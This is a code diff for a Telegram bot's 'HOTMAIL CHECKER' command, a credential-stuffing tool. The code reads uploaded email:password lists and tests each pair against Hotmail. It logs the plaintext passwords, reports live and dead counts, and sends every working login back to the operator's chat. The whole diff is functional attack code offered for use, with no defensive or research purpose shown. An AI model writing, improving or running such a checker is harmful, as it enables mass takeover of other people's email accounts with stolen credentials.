@@ -287,34 +287,69 @@ def handle_hotmail_command(message):
     except Exception as e:
         bot.send_message(message.chat.id, f"An error occurred: {str(e)}")
 
-def process_hotmail_command(chat_id, username, file_content):
+def process_hotmail(chat_id, username, file_content):
+    total_accounts = file_content.splitlines()
     start_time = time.time()
+    hits = []
+    dead = []
 
     # Send the initial message
-    initial_message = "Checking Your Accounts...\n\n"
+    initial_message = "Checking Your Accounts..."
     msg = bot.send_message(chat_id, initial_message)
 
-    # Process the Hotmail credentials
-    total, live_count, dead_count = process_hotmail(file_content, bot, chat_id, msg)
+    for account in total_accounts:
+        if not account.strip():  # Skip empty lines
+            continue
 
-    # Prepare the summary message
-    footer_info = (
+        try:
+            email, password = account.split(":", 1)
+        except ValueError as e:
+            bot.send_message(chat_id, f"Error processing account: {account}. Skipping.\nError: {e}")
+            continue
+
+        # Debugging: Log email and password
+        print(f"Checking: Email: {email}, Password: {password}")
+
+        result, response_message = check_hotmail(email, password)
+        if result == 'Hit':
+            hits.append(account)
+        else:
+            dead.append(account)
+
+        live_update = (
+            f"Checking: {email}\n"
+            f"Result: {'HIT✅' if result == 'Hit' else 'Dead'}\n\n"
+            f"Total: {len(hits) + len(dead)} | Live: {len(hits)} | Dead: {len(dead)}"
+        )
+
+        bot.edit_message_text(
+            chat_id=chat_id,
+            message_id=msg.message_id,
+            text=live_update
+        )
+
+    # Final summary
+    final_message = (
         f"↯ HOTMAIL CHECKER\n"
         f"⇒ GAME OVER\n\n"
         f"⤬ Summary\n"
-        f"Total: {total}\n"
-        f"LIVE: {live_count}\n"
-        f"DEAD: {dead_count}\n\n"
+        f"Total: {len(hits) + len(dead)}\n"
+        f"LIVE: {len(hits)}\n"
+        f"DEAD: {len(dead)}\n\n"
         f"－－－－－－－－－－－－－－－－\n"
-        f"🔹 Total Accounts Checked - {total}\n"
+        f"🔹 Total Accounts Checked - {len(hits) + len(dead)}\n"
         f"⏱️ Time Taken - {time.time() - start_time:.2f} seconds\n"
         f"▫️ Checked by: {username}\n"
         f"⚡️ Bot by - AFTAB 👑\n"
         f"－－－－－－－－－－－－－－－－"
     )
+    bot.send_message(chat_id, final_message)
 
-    # Send the summary message
-    bot.send_message(chat_id, footer_info)
+    # Automatically send hits
+    if hits:
+        hits_message = "Hits found:\n" + "\n".join(hits)
+        bot.send_message(chat_id, hits_message)
+
 
 @bot.message_handler(commands=['safeum'])
 def handle_safeum(message):
